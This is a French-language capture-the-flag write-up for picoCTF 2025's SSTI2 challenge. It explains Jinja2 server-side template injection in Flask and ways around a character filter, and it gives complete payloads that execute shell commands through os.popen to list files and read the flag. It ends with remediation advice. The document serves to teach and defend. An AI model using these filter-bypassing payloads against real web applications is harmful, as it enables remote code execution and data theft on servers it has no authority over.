

# SSTI2 — picoCTF 2025 (Web Exploitation)

**Auteur :** [Yahaya Meddy](https://github.com/exploit4040)  
**Catégorie :** Web Exploitation — Server-Side Template Injection (SSTI)  
**Difficulté :** Moyen (200 pts)  
**Plateforme :** picoCTF 2025 — organisé par Venax

---

## 1. Définition — Qu'est-ce qu'une SSTI ?

**Server-Side Template Injection (SSTI)** est une vulnérabilité qui se produit lorsqu'un attaquant injecte du code malveillant dans un template côté serveur, et que ce code est exécuté par le moteur de templating. Les moteurs de templates (comme Jinja2, Twig, Freemarker, etc.) permettent aux développeurs de générer du HTML dynamique en combinant des données utilisateur avec des modèles prédéfinis. Si les entrées utilisateur ne sont pas correctement assainies, un attaquant peut exécuter des commandes systèmes arbitraires, lire des fichiers sensibles, ou prendre le contrôle du serveur.

Dans notre cas, l'application utilise **Flask avec Jinja2** (le moteur de template par défaut de Flask), un framework Python très populaire pour les applications web.
<img width="726" height="776" alt="image" src="https://github.com/user-attachments/assets/6828ee60-aff0-4e6c-a575-7591f1d5a8da" />


---

## 2. Analyse de l'application

En accédant à l'instance, on découvre un site web qui permet aux utilisateurs de "s'annoncer" — une fonctionnalité de prise de parole publique. L'interface affiche les messages saisis. Le comportement suspect est immédiat : le site semble réafficher notre entrée, ce qui suggère qu'elle est passée dans un template.

<img width="817" height="418" alt="image" src="https://github.com/user-attachments/assets/8e7a0644-3060-4775-aea9-a9f3b4962fc4" />


### 2.1. Reconnaissance — Détection de la SSTI

Première étape de tout pentest SSTI : injecter une expression mathématique simple pour vérifier si le moteur l'évalue.

**Payload injecté :**

```jinja2
{{7*7}}
```
<img width="646" height="317" alt="image" src="https://github.com/user-attachments/assets/c47a32d6-14de-47c7-93ba-c83e50ef93da" />


**Résultat :** `49` — Le serveur a exécuté la multiplication. Confirmation immédiate de la présence d'une SSTI. La syntaxe `{{ }}` est caractéristique de **Jinja2** (Python).
<img width="1257" height="569" alt="image" src="https://github.com/user-attachments/assets/25486a6b-ba3f-4eac-a51a-0a7c566de585" />

Pour confirmer le moteur :

```jinja2
{{ 10 * "10" }}
```
<img width="658" height="308" alt="image" src="https://github.com/user-attachments/assets/9a78711d-a27d-4e06-b62b-deca0a6cc87c" />
<img width="1734" height="514" alt="image" src="https://github.com/user-attachments/assets/5ed1e21f-b77c-4b3e-b668-6b60b63a03ff" />

**Résultat :** `10101010101010101010` — Jinja2 multiplie une chaîne en la répétant, ce qui confirme qu'il s'agit bien de Jinja2/Flask.

---

## 3. Rencontre avec le WAF / Filtre

Fort de cette confirmation, essayons un payload SSTI classique pour exécuter des commandes :

```jinja2
{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}
```


**Réponse du serveur :**   <img width="1784" height="623" alt="image" src="https://github.com/user-attachments/assets/e1316973-b92c-425d-914c-376e58cb1b54" />


> Stop trying to break me >:(

Le WAF (Web Application Firewall) a bloqué notre tentative. Il filtre certains caractères et mots-clés. Le défi SSTI2 est donc un SSTI avec filtres qu'il faut contourner.

### 3.1. Analyse des caractères filtrés

Après plusieurs tests, on déduit que le filtre bloque probablement :

| Caractère / Motif | Raison |
|-------------------|--------|
| `.` (point) | Empêche l'accès direct aux attributs (ex: `config.__class__`) |
| `_` (underscore) | Empêche l'utilisation de `__class__`, `__globals__`, etc. |
| `[` `]` (crochets) | Empêche l'accès aux dictionnaires (ex: `['os']`) |
| `'` `"` (guillemets) | Empêche les chaînes littérales |
| `join` | Également filtré dans certains cas |
| `0x` | Encodage hexadécimal classique bloqué |

---

## 4. Techniques de Contournement

### 4.1. Contournement du point (`.`) avec `|attr()`

Jinja2 fournit un filtre appelé **`attr()`** qui permet d'accéder à un attribut par son nom sous forme de chaîne :

```jinja2
{{ 'foo'|attr('upper') }}
```
<img width="1915" height="642" alt="image" src="https://github.com/user-attachments/assets/fb466451-f34d-4710-a115-64abe57929f7" />


**Résultat :** `FOO` — La méthode `upper()` a été appelée via `attr()`.  
On remplace donc chaque `.` par `|attr('nom_attribut')`.

### 4.2. Contournement des underscores (`_`) avec Hex Encoding

Le double underscore `__` est bloqué. En Python, on peut encoder les caractères en hexadécimal. Le caractère `_` a pour valeur hexadécimale `0x5f`. Dans les chaînes Python, on l'exprime comme `\x5f`.

Ainsi :

| Bloqué | Encodé |
|--------|--------|
| `__` | `\x5f\x5f` |
| `__class__` | `\x5f\x5fclass\x5f\x5f` |
| `__globals__` | `\x5f\x5fglobals\x5f\x5f` |
| `__builtins__` | `\x5f\x5fbuiltins\x5f\x5f` |
| `__import__` | `\x5f\x5fimport\x5f\x5f` |

### 4.3. Contournement des crochets (`[]`) avec `__getitem__`

Au lieu d'écrire `dict['cle']`, on utilise la méthode magique `__getitem__` via `attr()` :

```jinja2
|attr('__getitem__')('__builtins__')
```
<img width="1679" height="427" alt="image" src="https://github.com/user-attachments/assets/e4e85597-0931-4111-98d7-e9d4cd26170d" />

Équivaut à : `['__builtins__']`

### 4.4. Utilisation de `request` comme point d'entrée

Plutôt que d'utiliser `config` ou `self` (qui sont plus verbeux), on utilise l'objet **`request`** de Flask, qui est accessible dans tous les templates et donne accès à l'application Flask ainsi qu'à ses globals.

**Chaîne complète de remontée d'attributs :**

```
request → request.application → application.__globals__ → __builtins__ → __import__ → os → popen
```

---

## 5. Exploitation — Payload Final

### 5.1. Lister le répertoire

```jinja2
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('ls -la')|attr('read')()}}
```


**Explication détaillée du payload :**

| Segment | Équivalent Python | Utilité |
|---------|------------------|---------|
| `request` | `request` | Objet requête Flask (disponible dans tous les templates) |
| `\|attr('application')` | `.application` | Accède à l'objet application Flask |
| `\|attr('\x5f\x5fglobals\x5f\x5f')` | `.__globals__` | Dictionnaire des variables globales de l'application |
| `\|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')` | `['__builtins__']` | Accède aux builtins Python |
| `\|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')` | `__import__('os')` | Importe le module `os` |
| `\|attr('popen')('ls -la')` | `.popen('ls -la')` | Exécute la commande système |
| `\|attr('read')()` | `.read()` | Lit la sortie de la commande |

**Résultat :** Liste complète des fichiers du répertoire courant, incluant le fichier `flag`.
<img width="1920" height="1009" alt="image" src="https://github.com/user-attachments/assets/9556bd05-e63b-4ac4-86a0-21d81334ce4c" />


### 5.2. Lecture du flag

```jinja2
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat flag')|attr('read')()}}
```

**Résultat :** Le flag s'affiche directement dans la réponse.
<img width="1920" height="420" alt="image" src="https://github.com/user-attachments/assets/47b86f77-913e-4f70-9ed7-fdbefcc343ef" />

---

## 6. Capture du Flag

```
picoCTF{...}
```

*(Le flag réel diffère selon l'instance et l'année)*

---

## 7. Résumé des Techniques Utilisées

| Problème | Technique de contournement | Syntaxe Jinja2 |
|----------|---------------------------|----------------|
| `.` (point) filtré | Filtre `attr()` | `\|attr('nom')` |
| `_` (underscore) filtré | Hex encoding `\x5f` | `'\x5f\x5fglobals\x5f\x5f'` |
| `[]` (crochets) filtrés | `__getitem__` | `\|attr('\x5f\x5fgetitem\x5f\x5f')('cle')` |
| `'` `"` filtrés | Hex encoding dans les chaînes | `'\x5f\x5f'` |
| Accès aux modules | Chaîne `request → ... → os.popen` | Via `application.__globals__.__builtins__.__import__` |

---

## 8. Recommandations de Sécurité

Pour corriger cette vulnérabilité, le développeur devrait :

1. **Ne JAMAIS passer d'entrée utilisateur directe dans un template sans échappement.** Utiliser les variables comme données passées au template, pas comme parties du template lui-même.

2. **Utiliser un sandboxing strict** — Jinja2 propose un environnement sandboxé (`SandboxedEnvironment`) qui restreint l'accès aux attributs dangereux.

3. **Valider et assainir les entrées en profondeur** — Un simple blacklist de caractères ne suffit jamais. Un encodage hexadécimal (`\x5f`) contourne le filtre d'underscore.

4. **Principe du moindre privilège** — L'application ne devrait pas s'exécuter avec les permissions d'un utilisateur qui peut lire des fichiers système.

5. **Utiliser un WAF plus robuste** avec une détection de patterns SSTI avancée (et pas seulement un blacklist de caractères).

---

## 9. Références

- [PayloadsAllTheThings — SSTI (Jinja2)](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Python.md)
- [Jinja2 Documentation — SandboxedEnvironment](https://jinja.palletsprojects.com/en/3.1.x/sandbox/)
- [OWASP — Server-Side Template Injection](https://owasp.org/www-community/attacks/Server_Side_Template_Injection)

---

**Auteur :**[Yahaya Meddy](https://github.com/exploit4040)  
**Plateforme :** picoCTF 2025  
**Catégorie :** Web Exploitation — SSTI
```
